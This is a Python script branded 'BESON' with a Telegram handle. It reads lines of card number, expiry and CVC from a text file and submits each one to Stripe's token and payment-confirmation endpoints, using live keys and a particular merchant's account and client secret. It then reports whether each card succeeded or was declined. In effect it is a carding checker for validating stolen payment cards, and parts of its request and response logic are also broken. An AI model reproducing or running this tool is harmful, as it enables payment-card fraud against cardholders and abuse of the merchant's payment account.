import requests
import pyfiglet

file = open('BESON.txt', "+r")
Z = '\033[1;31m'
F = '\033[2;32m'
B = '\033[2;36m'
X = '\033[1;33m'
C = '\033[2;35m'

logo = pyfiglet.figlet_format('            BESON ')
print(Z + logo)
k = ("----+----+-----+------+-----+")
print(X + k)
lo = ("Tele:@python_proffetional\nCh Tele:@python_proffetional")
print(C + lo)
i = ("----+----+-----+------+-----+")
print(B + i)
o = ("#====================================##============================")
print(F + o)

amount = int('500')
dollar = amount / 100
start_num = 0

for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    mm = P.split('|')[1]
    yy = P.split('|')[2][-2:]
    cvc = P.split('|')[3].replace('\n', '')
    P = P.replace('\n', '')

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    data = f'card[name]=VBF+Ffyyf&card[address_line1]=&card[address_city]=&card[address_state]=&card[address_zip]=&card[address_country]=AD&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=ee340a80-ab1f-4409-b9d7-654d355dc902af2fe8&muid=6019a845-d2ad-4046-a81b-824fd36195588be715&sid=189f9817-dd45-4a8b-b762-ab24d4d60277c09a67&payment_user_agent=stripe.js%2F279a4965ee%3B+stripe-js-v3%2F279a4965ee&time_on_page=187448&key=pk_live_5YK1Gie7AhO7nC4xzVYfYPr500jP9FKW8X'

    response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data).json()

    try:
        id = response['id']
    except Exception as e:
        if "success" in response:
            print("success")
       
        else:
            print("Your card was declined.")
            continue

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    }

    data = f'payment_method_data[type]=P&payment_method_data[P][n]={n}&payment_method_data[P][cvc]={cvc}&payment_method_data[P][mm]={mm}&payment_method_data[P][yy]={yy}&payment_method_data[guid]=9fb61995-4af3-4c06-8081-7f84afa3bad5807102&payment_method_data[muid]=ad19981e-b1f2-42f0-b74f-0f4ec0338e1f2596fd&payment_method_data[sid]=345c4b5e-85e7-4cf3-bf28-9834d5b460c935b693&payment_method_data[payment_user_agent]=stripe.js%2Fe788aede38%3B+stripe-js-v3%2Fe788aede38%3B+split-card-element&payment_method_data[time_on_page]=136660&expected_payment_method_type=card&key=pk_live_IuO9apxOM1AclLg9TOTxjUS0&_stripe_account=acct_1AAQmLIE1ijOzIgP&client_secret=pi_3NQIW4IE1ijOzIgP0W6ziDkM_secret_1DiSeoCjqAm5o5Xiq4qjjhsod'

    response = requests.post(
        'https://api.stripe.com/v1/payment_intents/pi_3NQIW4IE1ijOzIgP0W6ziDkM/confirm',
        headers=headers,
        data=data,
    )
    try:
        if "success" in response:
            print("success")
       
        else:
            print("Your card was declined.")
    except:
        print("success")
